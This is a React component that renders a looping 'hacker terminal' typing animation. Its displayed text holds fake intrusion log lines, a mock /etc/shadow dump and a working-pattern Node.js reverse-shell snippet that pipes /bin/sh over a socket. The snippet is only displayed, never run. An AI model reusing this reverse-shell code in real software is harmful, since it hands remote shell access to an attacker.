
'use client';

import { useState, useEffect, useRef } from 'react';
import { gsap } from 'gsap';

const codeSnippet = `[~] Initializing system analysis...
[+] Connecting to secure server: 192.168.1.101...
[+] Connection established.
[~] Bypassing firewall...
[!] Firewall bypassed. Access granted.

// Spawning reverse shell...
void function connect_back(host, port) {
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(port, host, function() {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return;
}();

[~] Executing payload...
[+] System compromised. Root access obtained.
> Accessing /etc/shadow...
> Dumping password hashes...
...
root:$6$aReallyLongSalt$anotherLongString...
daemon:*:19659:0:99999:7:::
bin:*:19659:0:99999:7:::
sys:*:19659:0:99999:7:::

> Mission accomplished.
> Erasing tracks...
> Disconnecting.`;

const CodeTypingEffect = () => {
  const [text, setText] = useState('');
  const cursorRef = useRef<HTMLSpanElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const charIndex = useRef(0);
  const timeoutIdRef = useRef<NodeJS.Timeout>();

  useEffect(() => {
    if (cursorRef.current) {
      gsap.to(cursorRef.current, {
        opacity: 0,
        duration: 0.5,
        repeat: -1,
        yoyo: true,
        ease: 'power2.inOut',
      });
    }
  }, []);

  useEffect(() => {
    const type = () => {
      if (charIndex.current < codeSnippet.length) {
        setText(codeSnippet.substring(0, charIndex.current + 1));
        charIndex.current++;
        
        if (containerRef.current) {
          containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }

        timeoutIdRef.current = setTimeout(type, 25 + Math.random() * 25);
      } else {
        timeoutIdRef.current = setTimeout(() => {
            setText('');
            charIndex.current = 0;
            type();
        }, 3000);
      }
    };
    
    timeoutIdRef.current = setTimeout(type, 500);

    return () => {
      if(timeoutIdRef.current) clearTimeout(timeoutIdRef.current);
    };
  }, []);

  return (
    <div ref={containerRef} className="bg-black/30 border border-border/50 rounded-lg p-4 w-full h-[400px] overflow-auto font-mono text-sm text-accent scrollbar-hide">
      <pre className="whitespace-pre-wrap">
        <code>{text}</code>
        <span ref={cursorRef} className="ml-1 -mb-1 inline-block h-4 w-2 bg-accent" />
      </pre>
    </div>
  );
};

export default CodeTypingEffect;
